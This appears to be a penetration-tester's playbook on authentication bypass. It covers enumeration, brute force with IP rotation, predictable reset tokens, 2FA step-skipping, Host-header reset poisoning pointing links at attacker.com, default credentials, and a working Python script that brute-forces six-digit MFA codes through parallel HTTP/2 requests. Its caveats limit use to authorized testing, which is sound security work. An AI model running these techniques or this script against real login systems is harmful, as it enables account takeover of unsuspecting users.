# Authentication bypass — playbook

## when to try
- Login forms, password-reset flows, MFA prompts, SSO gates, "remember me".
- Anywhere a credential or token is verified.

## key bug classes
- **Username enumeration** via timing or response delta (different message, different len, different status).
- **Brute force** when rate limit is missing/per-IP/per-username only — rotate IPs, rotate usernames.
- **Predictable tokens**: password-reset URLs with sequential ID, base64(`{"user_id":N}`), millisecond timestamps.
- **Logic flaws in 2FA**: send code → skip step → submit final form directly; or 2FA cookie set BEFORE OTP verified.
- **Password reset poisoning** — Host header attack: `Host: attacker.com` makes the reset email link point to attacker (see `host-header.md`).
- **OAuth account linking**: link victim's email to your social account → log in as them.
- **Default creds**: `admin:admin`, `admin:password`, vendor-specific (Tomcat, Jenkins, Grafana defaults).
- **MFA brute force**: 6-digit OTP × 1M attempts; if no per-attempt limit on the OTP-submit endpoint, race-condition via single-packet (see `race-conditions.md`).
- **"Stay signed in" cookie**: long-lived, signed only with weak secret → forge.

## confirmation flow
1. Map the full auth flow with a proxy. Note every endpoint and every state-bearing cookie/parameter.
2. Probe each step with the previous step skipped — does the next step accept the call?
3. Try logging in with two accounts and observe what state-token changes vs persists.
4. Reset-password flow: change `Host` header on the reset request → check the email link host.

## exploitation snippet
MFA brute via parallel races (single connection, HTTP/2):
```python
import asyncio, httpx
SES={"Cookie":"mfa_state=..."}
async def t(c, otp):
    r=await c.post("https://t/mfa", json={"otp":otp}, headers=SES)
    return r.status_code, otp
async def main():
    async with httpx.AsyncClient(http2=True, timeout=30) as c:
        for s in range(0, 1_000_000, 50):
            for sc, otp in await asyncio.gather(*[t(c, f"{i:06d}") for i in range(s, s+50)]):
                if sc==200: print("HIT", otp); return
asyncio.run(main())
```

## caveats
- Brute attempts log heavily. On real targets, do *one* attempt to confirm no rate limit, then write the report — don't actually crack.
- Don't reset real users' passwords. Use your own test accounts.

## provenance
PortSwigger Authentication labs. Public: GitHub OAuth account-linking 2020.
